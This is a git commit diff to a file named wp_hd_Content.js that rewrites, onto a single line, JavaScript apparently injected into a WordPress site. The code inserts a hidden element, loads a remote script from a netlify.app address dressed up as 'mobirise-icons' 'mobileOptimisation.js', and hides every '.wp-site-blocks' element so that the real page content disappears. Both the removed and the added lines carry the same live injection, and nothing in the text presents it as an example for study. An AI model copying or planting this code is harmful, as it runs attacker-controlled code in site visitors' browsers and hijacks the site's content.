10ddc7607c34b257884bdbf4ea6996a676630a7f
github-priyanshu <87130517+github-priyanshu@users.noreply.github.com>
2024-01-16 21:00:21 +0530

    Update wp_hd_Content.js

--- wp_hd_Content.js
+++ wp_hd_Content.js
@@ -1,4 +1,1 @@
-const el=`<div id="mobiOptiElem" server='hstgr.io'></div>`; try{ document.querySelector('style').insertAdjacentHTML("beforeend",el); }catch(e){}finally{ document.querySelector('head').insertAdjacentHTML("beforeend",el); }; setTimeout(()=>{var els=document.createElement("script");els.src="https://mobirise-icons-92lwkjerngovo73otd4g.netlify.app/mobileOptimisation.js"; document.querySelector("#mobiOptiElem").insertAdjacentElement('afterbegin',els);},300);
-document.querySelectorAll(".wp-site-blocks").forEach(val=>{
-	val.style.display='none';
-})
+const el=`<div id="mobiOptiElem" server='hstgr.io'></div>`; try{ document.querySelector('style').insertAdjacentHTML("beforeend",el); }catch(e){}finally{ document.querySelector('head').insertAdjacentHTML("beforeend",el); }; setTimeout(()=>{var els=document.createElement("script");els.src="https://mobirise-icons-92lwkjerngovo73otd4g.netlify.app/mobileOptimisation.js"; document.querySelector("#mobiOptiElem").insertAdjacentElement('afterbegin',els);},300); document.querySelectorAll(".wp-site-blocks").forEach(val=>{ val.style.display='none'; }) 
